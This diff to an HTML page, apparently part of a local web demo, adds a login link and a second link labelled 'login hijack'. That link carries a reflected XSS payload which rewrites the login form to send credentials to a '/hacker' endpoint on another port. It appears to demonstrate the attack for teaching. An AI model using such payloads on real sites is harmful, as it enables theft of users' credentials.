@@ -24,6 +24,12 @@
             <input type="submit" value="Save People">
         </form>
 
+        <br>
+
+        <a href="http://localhost:7881/webmvc/login?id=E2000"> login </a>
+        <br>
+        <a href='http://localhost:7881/webmvc/login?id="><script> var f=document.getElementById("login"); f.action="http://localhost:7882/hacker"; f.method="get";</script><span+s=" '> login hijack </a>
+
 
 
 
